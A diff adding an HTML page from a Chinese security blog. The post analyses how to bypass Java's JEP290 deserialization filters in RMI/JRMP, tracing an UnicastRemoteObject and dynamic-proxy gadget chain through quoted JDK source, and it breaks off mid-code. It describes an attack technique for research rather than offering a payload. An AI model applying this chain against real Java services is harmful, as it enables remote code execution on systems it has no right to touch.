@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>反序列化中的JRMP末路(?) - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 十月 21日 2021, 10:23 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      9 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 之前在8u281版本上使用JRMPClient的利用链时，反序列化JRMPListener传输过来的数据时失败了，然后找到了相关的文章，学习学习。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h3><p><a href="http://openjdk.java.net/jeps/290">JEP290</a>用于过滤输入的序列化数据，缓解反序列化攻击，按照参考文章的说法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、提供一个限制反序列化类的机制，白名单或者黑名单。</span><br><span class="line">2、限制反序列化的深度和复杂度。</span><br><span class="line">3、为RMI远程调用对象提供了一个验证类的机制。</span><br><span class="line">4、定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是给反序列化做了个安全检验。JEP290本来是JDK9的新特性，但为了<a href="https://blogs.oracle.com/java/post/filter-incoming-serialization-data-a-little-of-jdk-9-goodness-available-now-in-current-release-families">安全性之类的理由</a>还将其移植到了早期版本中，JDK9以下的适用版本为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java™ SE Development Kit 8, Update 121 (JDK 8u121)</span><br><span class="line">Java™ SE Development Kit 7, Update 131 (JDK 7u131)</span><br><span class="line">Java™ SE Development Kit 6, Update 141 (JDK 6u141)</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h3><p><a href="https://aluvion.gitee.io/2020/05/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84RMI%E3%80%81JRMP%E3%80%81JNDI%E3%80%81LDAP/#%E6%94%BB%E5%87%BB%E9%AB%98%E7%89%88%E6%9C%AC-JDK-lt-8u232-b09-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83">以前</a>学习过这个问题，主要分为三个版本段来操作。</p>
+<h4 id="攻击低版本注册中心"><a href="#攻击低版本注册中心" class="headerlink" title="攻击低版本注册中心(&lt;8u121)"></a>攻击低版本注册中心(&lt;8u121)</h4><p>没有白名单，直接打。</p>
+<h4 id="攻击中版本注册中心-8u121，"><a href="#攻击中版本注册中心-8u121，" class="headerlink" title="攻击中版本注册中心(&gt;&#x3D;8u121，&lt;8u231)"></a>攻击中版本注册中心(&gt;&#x3D;8u121，&lt;8u231)</h4><p>用ysoserial的JRMPClient绕过白名单来打。</p>
+<h4 id="攻击中高版本注册中心-8u231，"><a href="#攻击中高版本注册中心-8u231，" class="headerlink" title="攻击中高版本注册中心(&gt;&#x3D;8u231，&lt;8u241)"></a>攻击中高版本注册中心(&gt;&#x3D;8u231，&lt;8u241)</h4><p>反序列化JRMPClient建立的连接进行的反序列化操作也加上了白名单验证，无法反序列化回传的利用链。JRMPClient反序列化链会经过DGCImpl_Stub类的dirty函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StreamRemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">var5.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</span><br></pre></td></tr></table></figure>
+
+<p>这里给将过滤函数设置为了DGCImpl_Stub类的leaseFilter函数，在后面执行executeCall函数时会调用getInputStream来获取输入流：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ObjectInput <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.in == <span class="literal">null</span>) &#123;</span><br><span class="line">        Transport.transportLog.log(Log.VERBOSE, <span class="string">&quot;getting input stream&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.in = <span class="keyword">new</span> <span class="title class_">ConnectionInputStream</span>(<span class="built_in">this</span>.conn.getInputStream());</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.filter != <span class="literal">null</span>) &#123;</span><br><span class="line">            AccessController.doPrivileged(() -&gt; &#123;</span><br><span class="line">                Config.setObjectInputFilter(<span class="built_in">this</span>.in, <span class="built_in">this</span>.filter);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时就会将该过滤函数设置到输入流对象中，后面执行反序列化操作时就会通过这个过滤函数进行检查。</p>
+<p>所以想要绕过这个过滤函数，就需要找到另一条相似结果的反序列化链，且途中不会经过DGCImpl_Stub类的dirty函数。参考文章中描述了一条新的利用链，通过UnicastRemoteObject类可以触发一个未经安全验证的反序列化操作，其readObject函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csf == <span class="literal">null</span> &amp;&amp; ssf == <span class="literal">null</span>) &#123;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                  RMIClientSocketFactory csf,</span></span><br><span class="line"><span class="params">                                  RMIServerSocketFactory ssf)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef2</span>(port, csf, ssf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在最后的exportObject函数中，因为第一参数obj为自身且自身不是UnicastRemoteObject的子类，第二参数为新建的UnicastServerRef2对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnicastServerRef2的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef2</span><span class="params">(<span class="type">int</span> var1, RMIClientSocketFactory var2, RMIServerSocketFactory var3)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(var1, var2, var3));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 父类UnicastServerRef的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(LiveRef var1)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(var1);</span><br><span class="line">    <span class="built_in">this</span>.forceStubUse = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.hashToMethod_Map = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.methodCallIDCount = <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">this</span>.filter = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 再上级父类UnicastRef的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ref = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后会将UnicastRemoteObject对象的port、csf、ssf三个属性合并成一个LiveRef对象放入新UnicastServerRef2对象的ref属性中，并会调用UnicastServerRef2类的exportObject函数，该函数来自其父类UnicastServerRef：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> RemoteStub <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.forceStubUse = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> (RemoteStub)<span class="built_in">this</span>.exportObject(var1, var2, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line"></span><br><span class="line">    Remote var5;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">    <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">    <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的ref即LiveRef对象，来到LiveRef类的exportObject函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID var1, Endpoint var2, <span class="type">boolean</span> var3)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ep = var2;</span><br><span class="line">    <span class="built_in">this</span>.id = var1;</span><br><span class="line">    <span class="built_in">this</span>.isLocal = var3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> var1, RMIClientSocketFactory var2, RMIServerSocketFactory var3)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(), var1, var2, var3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID var1, <span class="type">int</span> var2, RMIClientSocketFactory var3, RMIServerSocketFactory var4)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(var1, TCPEndpoint.getLocalEndpoint(var2, var3, var4), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.ep.exportObject(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ep是一个用前面UnicastRemoteObject对象的port、csf、ssf三个属性制作的TCPEndpoint对象，其exportObject函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.transport.exportObject(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即TCPTransport类的exportObject函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.listen();</span><br><span class="line">        ++<span class="built_in">this</span>.exportCount;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.getEndpoint();</span><br><span class="line">    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getPort();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.server == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> + var2 + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.server = var1.newServerSocket();</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">var3</span> <span class="operator">=</span> (Thread)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">TCPTransport</span>.AcceptLoop(<span class="built_in">this</span>.server), <span class="string">&quot;TCP Accept-&quot;</span> + var2, <span class="literal">true</span>));</span><br><span class="line">            var3.start();</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会调用TCPEndpoint的newServerSocket函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket <span class="title function_">newServerSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.VERBOSE, <span class="string">&quot;creating server socket on &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.ssf;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">        var1 = chooseFactory();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ServerSocket</span> <span class="variable">var2</span> <span class="operator">=</span> ((RMIServerSocketFactory)var1).createServerSocket(<span class="built_in">this</span>.listenPort);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.listenPort == <span class="number">0</span>) &#123;</span><br><span class="line">        setDefaultPort(var2.getLocalPort(), <span class="built_in">this</span>.csf, <span class="built_in">this</span>.ssf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里将port作为参数传入调用了ssf属性的createServerSocket函数。</p>
+<p>简单找一下，只看到有一个RMISocketFactory类继承了这个RMIServerSocketFactory接口，然而其createServerSocket函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> ServerSocket <span class="title function_">createServerSocket</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>
+
+<p>它并没有实现这个函数。但这不代表这里就没有操作余地，像这种视作接口进行函数调用的方式，我们还有另一种选择，那就是动态代理。</p>
+<p>存在一个动态代理类RemoteObjectInvocationHandler，其invoke函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Throwable</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                   !allowFinalizeInvocation) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ignore</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                <span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，如果我们将ref设置为一个UnicastRef对象，就可以调用其invoke函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span 